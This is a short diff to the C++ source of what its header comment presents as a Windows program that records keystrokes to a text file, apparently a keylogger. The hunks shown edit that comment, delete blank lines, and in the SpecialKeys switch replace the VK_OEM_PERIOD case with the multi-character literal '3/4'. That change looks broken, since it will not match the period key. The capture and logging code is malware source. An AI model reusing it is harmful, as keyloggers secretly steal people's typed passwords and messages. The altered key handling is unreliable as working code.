@@ -1,4 +1,4 @@
-//This program records the keystrokes in a text file called 
+//This program records the keystrokes in a text file  
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
@@ -34,7 +34,7 @@ bool SpecialKeys(int S_key)
 		cout << "\n";
 		LOG("\n");
 		return true;
-	case VK_OEM_PERIOD:
+	case '3/4':
 		cout << ".";
 		LOG(".");
 		return true;
@@ -86,8 +86,6 @@ bool SpecialKeys(int S_key)
 		return false;
 	}
 }
-
-
 
 
 int main()
